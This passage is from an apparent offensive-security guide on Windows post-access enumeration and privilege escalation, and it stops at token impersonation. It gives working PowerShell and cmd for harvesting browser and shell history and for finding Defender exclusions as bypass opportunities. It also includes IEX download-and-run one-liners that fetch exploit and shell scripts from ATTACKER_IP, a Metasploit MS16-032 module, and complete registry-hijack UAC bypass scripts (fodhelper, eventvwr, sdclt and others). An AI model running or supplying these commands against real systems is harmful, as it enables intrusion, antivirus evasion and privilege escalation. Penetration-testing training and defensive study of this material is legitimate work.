        Target = $shortcut.TargetPath
        LastAccessed = $_.LastAccessTime
    }
}
```

**Office recent files:**

```powershell
# Word recent documents
Get-ItemProperty "HKCU:\Software\Microsoft\Office\*\Word\File MRU" -ErrorAction SilentlyContinue

# Excel recent documents
Get-ItemProperty "HKCU:\Software\Microsoft\Office\*\Excel\File MRU" -ErrorAction SilentlyContinue

# PowerPoint recent documents
Get-ItemProperty "HKCU:\Software\Microsoft\Office\*\PowerPoint\File MRU" -ErrorAction SilentlyContinue

# All Office recent files
Get-ItemProperty "HKCU:\Software\Microsoft\Office\*\*\File MRU" -ErrorAction SilentlyContinue | Format-List
```

**Recent files from registry:**

```powershell
# RecentDocs registry key
Get-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" | Select-Object -ExpandProperty Property

# Parse binary data
$recentDocs = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
$recentDocs.PSObject.Properties | Where-Object { $_.Name -match '^\d+$' } | ForEach-Object {
    [System.Text.Encoding]::Unicode.GetString($_.Value) -replace '\x00', ''
}

# Recent documents by extension
Get-ChildItem "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" | ForEach-Object {
    $ext = $_.PSChildName
    Write-Host "Extension: $ext"
    Get-ItemProperty $_.PSPath
}
```

**Jump lists (Windows 7+):**

```powershell
# Automatic destinations (recent files)
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations" -Force

# Custom destinations (pinned items)
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations" -Force

# Parse jump list files (requires external tools for full parsing)
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*.automaticDestinations-ms" | 
    Select-Object Name, LastWriteTime, Length
```

#### Browser Recent Files and Downloads

**Internet Explorer/Edge (Legacy):**

```powershell
# IE Recent URLs
Get-ItemProperty "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs" -ErrorAction SilentlyContinue

# IE Download history
Get-ItemProperty "HKCU:\Software\Microsoft\Internet Explorer\Download" -ErrorAction SilentlyContinue
```

**Chrome history and downloads:**

```powershell
# Chrome History location
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"

# Copy to temp (file is locked when Chrome is running)
Copy-Item $chromePath "$env:TEMP\ChromeHistory" -Force

# Query using SQL (requires SQLite tools or parsing)
# Alternative: strings search
Select-String -Path "$env:TEMP\ChromeHistory" -Pattern "http" | Select-Object -First 20

# Chrome download history
$chromeDownloads = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
# Contains downloads table with paths
```

**Firefox history and downloads:**

```powershell
# Firefox profile location
$firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
Get-ChildItem $firefoxProfiles -Filter "places.sqlite" -Recurse

# Copy database
$ffDb = Get-ChildItem $firefoxProfiles -Filter "places.sqlite" -Recurse | Select-Object -First 1
Copy-Item $ffDb.FullName "$env:TEMP\FFPlaces.sqlite" -Force
```

**Edge Chromium:**

```powershell
# Edge Chromium history
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
Copy-Item $edgePath "$env:TEMP\EdgeHistory" -Force -ErrorAction SilentlyContinue
```

#### File System Recent Activity

**Search for recently modified files:**

```powershell
# Files modified in last 7 days
Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
    Select-Object FullName, LastWriteTime |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 50

# Specific user directory recent files
Get-ChildItem "$env:USERPROFILE" -Recurse -Force -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-1) } |
    Select-Object FullName, LastWriteTime

# Recently accessed files (last access time)
Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -Force -ErrorAction SilentlyContinue |
    Where-Object { $_.LastAccessTime -gt (Get-Date).AddHours(-24) } |
    Select-Object FullName, LastAccessTime
```

**Interesting file types recently modified:**

```powershell
# Recent documents
Get-ChildItem -Path "$env:USERPROFILE" -Include *.docx,*.xlsx,*.pdf,*.txt -Recurse -Force -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
    Select-Object FullName, LastWriteTime |
    Sort-Object LastWriteTime -Descending

# Recent scripts
Get-ChildItem -Path C:\ -Include *.ps1,*.bat,*.cmd,*.vbs -Recurse -Force -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) } |
    Select-Object FullName, LastWriteTime

# Configuration files
Get-ChildItem -Path C:\ -Include *.xml,*.config,*.ini -Recurse -Force -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
    Select-Object FullName, LastWriteTime |
    Select-Object -First 20
```

#### Prefetch Files Analysis

**Windows Prefetch (execution evidence):**

```powershell
# List prefetch files
Get-ChildItem "C:\Windows\Prefetch\*.pf" -Force | Select-Object Name, LastWriteTime | Sort-Object LastWriteTime -Descending

# Recently executed programs
Get-ChildItem "C:\Windows\Prefetch\*.pf" -Force |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
    Select-Object Name, LastWriteTime |
    Sort-Object LastWriteTime -Descending
```

[Inference] Prefetch files indicate program execution but require parsing tools for detailed timeline analysis; LastWriteTime indicates recent execution.

#### Windows Search Index

**Query Windows Search:**

```powershell
# Search for recently modified documents
$objConnection = New-Object -ComObject ADODB.Connection
$objRecordSet = New-Object -ComObject ADODB.Recordset
$objConnection.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows'")

$query = "SELECT System.ItemPathDisplay, System.DateModified FROM SYSTEMINDEX ORDER BY System.DateModified DESC"
$objRecordSet.Open($query, $objConnection)

while (-not $objRecordSet.EOF) {
    [PSCustomObject]@{
        Path = $objRecordSet.Fields.Item("System.ItemPathDisplay").Value
        Modified = $objRecordSet.Fields.Item("System.DateModified").Value
    }
    $objRecordSet.MoveNext()
}

$objRecordSet.Close()
$objConnection.Close()
```

#### PowerShell History

**PowerShell command history:**

```powershell
# Current session history
Get-History

# PSReadLine history (persistent)
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# All users' PowerShell history (if accessible)
Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue |
    ForEach-Object { 
        Write-Host "`n=== $($_.FullName) ===" -ForegroundColor Cyan
        Get-Content $_.FullName 
    }
```

### Windows Defender Status

#### Windows Defender Service Status

**Check if Windows Defender is running:**

```powershell
# Service status
Get-Service -Name WinDefend

# Detailed service information
Get-Service -Name WinDefend | Select-Object -Property *

# Check if service is running
(Get-Service -Name WinDefend).Status

# Multiple Defender services
Get-Service -Name "WinDefend","WdNisSvc","WdNisDrv","WdFilter","Sense" | Select-Object Name, Status, StartType
```

**Output interpretation:**

```
Status   Name               DisplayName
------   ----               -----------
Running  WinDefend          Windows Defender Antivirus Service
Running  WdNisSvc           Windows Defender Network Inspection Service
```

#### Windows Defender Configuration

**Real-time protection status:**

```powershell
# Get Defender preferences
Get-MpPreference

# Specific protection settings
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableBlockAtFirstSeen, DisableIOAVProtection, DisableScriptScanning

# Real-time protection status
(Get-MpPreference).DisableRealtimeMonitoring

# If True = Disabled, If False = Enabled
```

**Comprehensive Defender status:**

```powershell
# Computer status (threat detection info)
Get-MpComputerStatus

# Key fields
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, BehaviorMonitorEnabled, AntispywareEnabled

# Definition versions
Get-MpComputerStatus | Select-Object AntivirusSignatureVersion, AntivirusSignatureLastUpdated, AntispywareSignatureVersion
```

**Threat detection information:**

```powershell
# Recent threats detected
Get-MpThreat

# Threat catalog
Get-MpThreatCatalog

# Detection history
Get-MpThreatDetection
```

#### Exclusions Enumeration

**List all exclusions:**

```powershell
# Path exclusions
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

# Extension exclusions
Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension

# Process exclusions
Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess

# All exclusions combined
$prefs = Get-MpPreference
[PSCustomObject]@{
    ExcludedPaths = $prefs.ExclusionPath
    ExcludedExtensions = $prefs.ExclusionExtension
    ExcludedProcesses = $prefs.ExclusionProcess
}
```

**Exclusions provide potential bypass opportunities:**

```powershell
# If C:\Temp is excluded, files placed there won't be scanned
# If .xyz extension excluded, rename payload to payload.xyz
```

#### Scan History and Logs

**Recent scan information:**

```powershell
# Last scan times
Get-MpComputerStatus | Select-Object QuickScanStartTime, QuickScanEndTime, FullScanStartTime, FullScanEndTime

# Last scan age
Get-MpComputerStatus | Select-Object QuickScanAge, FullScanAge
```

**Windows Defender event logs:**

```powershell
# Defender operational log
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 20 | Format-List

# Detection events (Event ID 1116 = Malware detected)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; ID=1116} -MaxEvents 10 -ErrorAction SilentlyContinue

# Action taken events (Event ID 1117)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; ID=1117} -MaxEvents 10 -ErrorAction SilentlyContinue

# Real-time protection disabled (Event ID 5001)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; ID=5001} -MaxEvents 5 -ErrorAction SilentlyContinue
```

**Parse detection details:**

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; ID=1116} -MaxEvents 5 | ForEach-Object {
    [PSCustomObject]@{
        TimeCreated = $_.TimeCreated
        Message = $_.Message
        ThreatName = ($_.Message -split "`n" | Select-String "Name:").ToString().Split(":")[1].Trim()
    }
}
```

#### Defender Features Status

**Cloud-delivered protection:**

```powershell
# MAPS (Microsoft Active Protection Service) membership
(Get-MpPreference).MAPSReporting

# Values: 0 = Disabled, 1 = Basic, 2 = Advanced
```

**Sample submission:**

```powershell
# Automatic sample submission
(Get-MpPreference).SubmitSamplesConsent

# Values: 0 = Always prompt, 1 = Send safe samples automatically, 2 = Never send, 3 = Send all samples automatically
```

**Tamper Protection status:**

```powershell
# Check if Tamper Protection is enabled (registry)
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -ErrorAction SilentlyContinue

# Value: 5 = Enabled, 4 = Disabled, 0 = Disabled
```

[Inference] Tamper Protection, when enabled, prevents disabling Windows Defender even with administrative privileges; registry value interpretation may vary by Windows version.

#### Attack Surface Reduction (ASR) Rules

**List ASR rules:**

```powershell
# Get ASR rules configuration
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions

# Combine IDs with actions
$ids = (Get-MpPreference).AttackSurfaceReductionRules_Ids
$actions = (Get-MpPreference).AttackSurfaceReductionRules_Actions

for ($i = 0; $i -lt $ids.Count; $i++) {
    [PSCustomObject]@{
        RuleID = $ids[$i]
        Action = switch ($actions[$i]) {
            0 { "Disabled" }
            1 { "Block" }
            2 { "Audit" }
            6 { "Warn" }
            default { "Unknown" }
        }
    }
}
```

**Common ASR rule GUIDs:**

- `BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550` - Block executable content from email/webmail
- `D4F940AB-401B-4EFC-AADC-AD5F3C50688A` - Block Office applications from creating child processes
- `3B576869-A4EC-4529-8536-B80A7769E899` - Block Office applications from creating executable content
- `5BEB7EFE-FD9A-4556-801D-275E5FFC04CC` - Block execution of potentially obfuscated scripts

#### Controlled Folder Access

**Check Controlled Folder Access status:**

```powershell
# Status
(Get-MpPreference).EnableControlledFolderAccess

# Values: 0 = Disabled, 1 = Enabled, 2 = Audit mode

# Protected folders
Get-MpPreference | Select-Object -ExpandProperty ControlledFolderAccessProtectedFolders

# Allowed applications
Get-MpPreference | Select-Object -ExpandProperty ControlledFolderAccessAllowedApplications
```

#### Registry-based Defender Status

**Alternative registry checks:**

```powershell
# Defender enabled status
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -ErrorAction SilentlyContinue

# Real-time protection
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -ErrorAction SilentlyContinue

# Behavior monitoring
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -ErrorAction SilentlyContinue

# Cloud protection
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Spynet" -Name "SpynetReporting" -ErrorAction SilentlyContinue
```

#### Third-party Antivirus Detection

**Enumerate all antivirus products:**

```powershell
# Using WMI (Windows 8+)
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct

# Detailed information
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | 
    Select-Object displayName, productState, pathToSignedProductExe

# Windows 7 (use SecurityCenter instead of SecurityCenter2)
Get-WmiObject -Namespace root/SecurityCenter -Class AntiVirusProduct -ErrorAction SilentlyContinue
```

**Parse product state:**

```powershell
$avProducts = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct

foreach ($av in $avProducts) {
    $hexState = '{0:x6}' -f $av.productState
    $enabled = $hexState.Substring(2,2) -eq "10"
    $updated = $hexState.Substring(4,2) -eq "00"
    
    [PSCustomObject]@{
        Name = $av.displayName
        Enabled = $enabled
        Updated = $updated
        Path = $av.pathToSignedProductExe
    }
}
```

### Comprehensive Enumeration Script

```powershell
function Get-WindowsPostAccessInfo {
    Write-Host "`n=== PowerShell Information ===" -ForegroundColor Cyan
    $PSVersionTable | Format-List
    Write-Host "Execution Policy:" (Get-ExecutionPolicy -List | Format-Table | Out-String)
    Write-Host "Language Mode:" $ExecutionContext.SessionState.LanguageMode
    
    Write-Host "`n=== Windows Defender Status ===" -ForegroundColor Cyan
    try {
        $defenderStatus = Get-MpComputerStatus -ErrorAction Stop
        $defenderStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled | Format-List
        
        $prefs = Get-MpPreference
        Write-Host "`nExclusions:"
        Write-Host "  Paths:" $prefs.ExclusionPath
        Write-Host "  Extensions:" $prefs.ExclusionExtension
        Write-Host "  Processes:" $prefs.ExclusionProcess
    } catch {
        Write-Host "Unable to query Defender (may not be installed or accessible)" -ForegroundColor Yellow
    }
    
    Write-Host "`n=== Recent Files ===" -ForegroundColor Cyan
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Force -ErrorAction SilentlyContinue | 
        Select-Object -First 10 Name, LastWriteTime | Format-Table
    
    Write-Host "`n=== PowerShell History ===" -ForegroundColor Cyan
    if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
        Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" | Select-Object -Last 10
    }
    
    Write-Host "`n=== Antivirus Products ===" -ForegroundColor Cyan
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue |
        Select-Object displayName, productState | Format-Table
}

# Execute
Get-WindowsPostAccessInfo
```

### Important Related Topics

For comprehensive Windows post-access enumeration, also investigate:

- **User and group enumeration** (net user, net localgroup, Get-LocalUser)
- **Privilege enumeration** (whoami /priv, Get-Acl, token privileges)
- **Scheduled tasks** (Get-ScheduledTask, schtasks)
- **Running processes and services** (Get-Process, Get-Service, tasklist)
- **Network connections** (Get-NetTCPConnection, netstat)
- **Installed software** (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall*)
- **AppLocker/WDAC policies** (Get-AppLockerPolicy, device guard status)

---

## Windows Privilege Escalation Vectors

### Kernel Exploits (Windows-specific CVEs)

Kernel exploits leverage vulnerabilities in the Windows operating system to escalate privileges from standard user to SYSTEM. These exploits target core OS components and device drivers.

#### Identifying Windows Version and Patch Level

**System information commands:**

```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

**PowerShell version check:**

```powershell
Get-ComputerInfo | Select-Object OsName, OsVersion, OsBuildNumber
[System.Environment]::OSVersion.Version
```

**Hotfix enumeration:**

```cmd
wmic qfe list full
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

**PowerShell hotfix query:**

```powershell
Get-HotFix | Sort-Object -Property InstalledOn -Descending
Get-HotFix | Where-Object {$_.InstalledOn -gt (Get-Date).AddDays(-30)}
```

**Check for specific KB (Knowledge Base) update:**

```cmd
wmic qfe where "HotFixID='KB4012212'" list full
```

**Architecture detection:**

```cmd
echo %PROCESSOR_ARCHITECTURE%
wmic os get osarchitecture
```

#### Major Windows Kernel Exploits

**MS16-032 (Secondary Logon Handle Privilege Escalation)**

- **CVE:** CVE-2016-0099
- **Affected:** Windows 7, 8, 8.1, 10 (pre-March 2016), Server 2008, 2012
- **Description:** Exploits Secondary Logon Service to escalate privileges

**Detection:**

```cmd
systeminfo | findstr /C:"OS Name"
wmic qfe where "HotFixID='KB3139914'" list
```

**[Inference]** Exploitation typically requires compiling or downloading precompiled exploit:

```powershell
# Example PowerShell Empire module usage
Invoke-MS16032 -Command "cmd.exe /c whoami > C:\temp\output.txt"
```

**MS16-135 (Windows Kernel-Mode Drivers EoP)**

- **CVE:** CVE-2016-7255
- **Affected:** Windows 7, 8.1, 10 (Anniversary Update), Server 2008, 2012, 2016
- **Description:** Win32k.sys kernel driver vulnerability

**MS17-010 (EternalBlue)**

- **CVE:** CVE-2017-0144
- **Affected:** Windows XP, Vista, 7, 8.1, 10, Server 2003-2016
- **Description:** SMBv1 remote code execution (primarily for lateral movement)
- **Patch:** KB4013389

**Detection:**

```cmd
wmic qfe where "HotFixID='KB4013389'" list
```

**CVE-2018-8120 (Win32k Elevation of Privilege)**

- **Affected:** Windows 7, Server 2008 R2
- **Patch:** KB4131188, KB4131185

**CVE-2019-0708 (BlueKeep)**

- **Affected:** Windows XP, Vista, 7, Server 2003, 2008
- **Description:** Remote Desktop Services vulnerability
- **Patch:** KB4499175

**CVE-2019-1388 (UAC Bypass via Certificate Dialog)**

- **Affected:** Windows 7, 8.1, 10 (pre-November 2019)
- **Description:** UAC bypass through Windows Certificate Dialog

**CVE-2020-0787 (BITS Privilege Escalation)**

- **Affected:** Windows 7, 8.1, 10, Server 2008-2019
- **Description:** Background Intelligent Transfer Service (BITS) arbitrary file move
- **Patch:** KB4534310

**CVE-2020-1472 (Zerologon)**

- **Affected:** Windows Server 2008-2019 (Domain Controllers)
- **Description:** Netlogon authentication bypass
- **Patch:** KB4571723

**CVE-2021-1675/CVE-2021-34527 (PrintNightmare)**

- **Affected:** All Windows versions (pre-July 2021)
- **Description:** Print Spooler remote code execution
- **Patch:** KB5004945

**Detection:**

```powershell
Get-Service -Name Spooler
Get-HotFix | Where-Object {$_.HotFixID -match "KB5004945"}
```

**CVE-2021-36934 (HiveNightmare/SeriousSAM)**

- **Affected:** Windows 10 (1809+), Windows 11, Server 2019+
- **Description:** Overly permissive ACLs on SAM/SYSTEM/SECURITY registry hives
- **Patch:** KB5004605

**Exploitation:**

```cmd
icacls C:\Windows\System32\config\SAM
# If vulnerable, standard users can read SAM
```

**CVE-2022-21999 (SpoolFool)**

- **Affected:** Windows 7, 8.1, 10, 11, Server 2008-2022
- **Description:** Print Spooler privilege escalation via AddPrinterDriverEx
- **Patch:** KB5010342

#### Exploiting Kernel Vulnerabilities

**General exploitation workflow:**

1. **Identify OS version and missing patches**
2. **Match version to known exploits**
3. **Transfer exploit to target**
4. **Compile if necessary (architecture-specific)**
5. **Execute exploit**
6. **Verify SYSTEM privileges**

**Exploit search resources:**

```powershell
# Search for exploits by Windows version
# Common repositories:
# - exploit-db.com
# - github.com/SecWiki/windows-kernel-exploits
# - github.com/offensive-security/exploitdb
```

**Example exploit execution (MS16-032):**

```powershell
# Download exploit
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-MS16032.ps1')

# Execute with payload
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

**Metasploit kernel exploit usage:**

```bash
# On attacker machine
msfconsole
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
set LHOST ATTACKER_IP
set LPORT 4444
exploit
```

**[Inference]** Kernel exploit stability varies. Some exploits may crash the system or require specific conditions. Test in lab environments when possible.

#### Automated Kernel Exploit Suggestion Tools

**Windows-Exploit-Suggester:**

```bash
# On attacker machine (requires Python)
python windows-exploit-suggester.py --database 2024-10-11-mssb.xls --systeminfo systeminfo.txt
```

**Sherlock (PowerShell):**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Sherlock.ps1')
Find-AllVulns
```

**Watson (C# compiled):**

```cmd
watson.exe
```

**WES-NG (Windows Exploit Suggester - Next Generation):**

```bash
# On attacker machine
python wes.py systeminfo.txt --impact "Elevation of Privilege"
```

### UAC Bypass Techniques

User Account Control (UAC) is a Windows security feature that requires administrator approval for privileged operations. UAC bypass techniques allow standard users with administrator group membership to execute commands with elevated privileges without triggering UAC prompts.

#### Understanding UAC Levels

**UAC integrity levels:**

- **Low** - Sandboxed processes (Protected Mode IE)
- **Medium** - Standard user processes
- **High** - Administrator processes (elevated)
- **System** - System services and kernel

**Check current integrity level:**

```cmd
whoami /groups | findstr "Mandatory"
```

**Output interpretation:**

- `Mandatory Label\Medium Mandatory Level` - Standard user
- `Mandatory Label\High Mandatory Level` - Elevated administrator
- `Mandatory Label\System Mandatory Level` - SYSTEM account

**UAC settings (Registry):**

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
```

**Key values:**

- `ConsentPromptBehaviorAdmin` - Admin approval mode behavior
    - 0 = Elevate without prompting
    - 1 = Prompt for credentials on secure desktop
    - 2 = Prompt for consent on secure desktop
    - 5 = Prompt for consent (default)
- `EnableLUA` - UAC enabled (1) or disabled (0)
- `PromptOnSecureDesktop` - Show prompts on secure desktop

#### Common UAC Bypass Techniques

**fodhelper.exe Bypass (CVE-2019-1388 related)**

**Description:** Exploits fodhelper.exe, an auto-elevated binary that reads registry keys under user control.

**Requirements:**

- User is member of Administrators group
- UAC is enabled but not set to "Always notify"

**Exploitation:**

```cmd
rem Set registry key
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f

rem Execute fodhelper
fodhelper.exe

rem Cleanup
reg delete HKCU\Software\Classes\ms-settings /f
```

**PowerShell version:**

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start cmd.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

**eventvwr.exe Bypass**

**Description:** Event Viewer reads registry keys from HKCU which can be hijacked.

**Exploitation:**

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\mscfile\shell\open\command /v DelegateExecute /t REG_SZ /f
eventvwr.exe
reg delete HKCU\Software\Classes\mscfile /f
```

**PowerShell script:**

```powershell
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "powershell.exe -c Start-Process cmd.exe -Verb runAs" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\eventvwr.exe"
Start-Sleep 2
Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force
```

**sdclt.exe Bypass (App Paths Hijacking)**

**Description:** Backup and Restore control panel application exploitation.

**Exploitation:**

```cmd
reg add HKCU\Software\Classes\Folder\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\Folder\shell\open\command /v DelegateExecute /t REG_SZ /f
sdclt.exe /KickOffElev
reg delete HKCU\Software\Classes\Folder /f
```

**computerdefaults.exe Bypass**

**Exploitation:**

```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
computerdefaults.exe
reg delete HKCU\Software\Classes\ms-settings /f
```

**slui.exe Bypass (File Association)**

**Description:** Software Licensing UI executable exploitation.

**Exploitation:**

```cmd
reg add HKCU\Software\Classes\exefile\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\exefile\shell\open\command /v DelegateExecute /t REG_SZ /f
slui.exe
reg delete HKCU\Software\Classes\exefile /f
```

**DiskCleanup Scheduled Task Hijack**

**Description:** DiskCleanup task runs with elevated privileges and can be hijacked.

**Exploitation:**

```cmd
rem Create malicious DLL
rem Place in %temp%\pwn.dll

rem Set environment variable
set __COMPAT_LAYER=RunAsInvoker

rem Trigger scheduled task
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I
```

**UACME Project Exploits**

**[Unverified]** UACME (by @hfiref0x) contains 60+ UAC bypass methods: https://github.com/hfiref0x/UACME

**Common UACME methods:**

```cmd
rem Method 33 (fodhelper)
Akagi64.exe 33

rem Method 34 (sdclt - app paths)
Akagi64.exe 34

rem Method 41 (event viewer)
Akagi64.exe 41
```

#### PowerShell UAC Bypass Scripts

**Invoke-EventVwrBypass:**

```powershell
function Invoke-EventVwrBypass {
    Param ([String]$Command)
    
    New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
    Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value $Command -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "DelegateExecute" -Value "" -Force
    Start-Process "C:\Windows\System32\eventvwr.exe"
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force
}

# Usage
Invoke-EventVwrBypass -Command "powershell.exe -ep bypass -c 'Start-Process cmd.exe -Verb runAs'"
```

**Invoke-FodhelperBypass:**

```powershell
function Invoke-FodhelperBypass {
    Param ([String]$Command)
    
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Command -Force
    Start-Process "C:\Windows\System32\fodhelper.exe"
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
}

# Usage
Invoke-FodhelperBypass -Command "cmd.exe"
```

#### UAC Bypass Detection and Prevention

**Detect if UAC bypass is possible:**

```powershell
# Check if user is admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Check if running elevated
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$isElevated = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin -and -not $isElevated) {
    Write-Host "UAC bypass may be possible"
}
```

### Token Impersonation

Token impersonation allows a process to execute code in the security context of another user or service. When a privileged user authenticates to a compromised system, their access token can be duplicated and impersonated.

#### Understanding Windows Access Tokens

**Token types:**

- **Primary Token** - Associated with user accounts and processes
- **Impersonation Token** - Used to impersonate another user in client/server applications

**Impersonation levels:**

- **SecurityAnonymous** - No impersonation
- **SecurityIdentification** - Server can identify client but not impersonate
- **SecurityImpersonation** - Server can impersonate client on local system
- **SecurityDelegation** - Server can impersonate client on remote systems

**Token privileges:**

```cmd
whoami /priv
```

**Key privileges for exploitation:**

- **SeImpersonatePrivilege** - Impersonate a client after authentication
- **SeAssignPrimaryTokenPrivilege** - Assign primary token to a process
- **SeDebugPrivilege** - Debug programs (read process memory)
- **SeTcbPrivilege** - Act as part of operating system
- **SeBackupPrivilege** - Backup files and directories
- **SeRestorePrivilege** - Restore files and directories
- **SeLoadDriverPrivilege** - Load/unload device drivers

#### Identifying Token Impersonation Opportunities

**Check current privileges:**

```cmd
whoami /priv
```

**Look for enabled privileges:**

```powershell
$privileges = whoami /priv
if ($privileges -match "SeImpersonatePrivilege.*Enabled") {
    Write-Host "SeImpersonatePrivilege is enabled - token impersonation possible"
}
```

**List all access tokens on system (requires elevated privileges):**

```powershell
# Using PowerShell
Get-Process | Select-Object Name, Id, @{Name="User";Expression={(Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)").GetOwner().User}}
```

**Identify high-privilege processes:**

```cmd
tasklist /v
tasklist /v | findstr "SYSTEM"
```

#### Potato Exploits (Token Impersonation)

**Hot Potato (CVE-2016-0051)**

